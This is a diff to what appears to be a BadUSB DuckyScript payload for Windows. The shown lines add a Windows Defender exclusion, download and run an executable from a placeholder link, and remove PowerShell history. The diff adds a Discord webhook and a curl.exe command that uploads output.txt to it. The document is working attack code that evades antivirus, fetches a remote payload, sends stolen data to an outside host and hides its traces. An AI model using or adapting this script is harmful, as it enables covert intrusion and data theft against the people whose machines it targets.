@@ -5,6 +5,9 @@ ENTER
 DELAY 3000
 ALT y
 DELAY 2000
+STRING $webhook = 'DISCORD_WEBHOOK'
+ENTER
+DELAY 500
 STRING cd C:\; mkdir temp; cd temp; Add-MpPreference -ExclusionPath "C:\temp"
 ENTER
 DELAY 500
@@ -13,6 +16,9 @@ STRING $down = New-Object System.Net.WebClient; $url = 'LINK_TO_EXE'; $file = 'C
 ENTER
 DELAY 5000
 STRING Remove-MpPreference -ExclusionPath "C:\temp"
+ENTER
+DELAY 500
+STRING curl.exe -F "file1=@output.txt" $webhook
 ENTER
 DELAY 500
 STRING rm -r temp ; Remove-Item (Get-PSreadlineOption).HistorySavePath
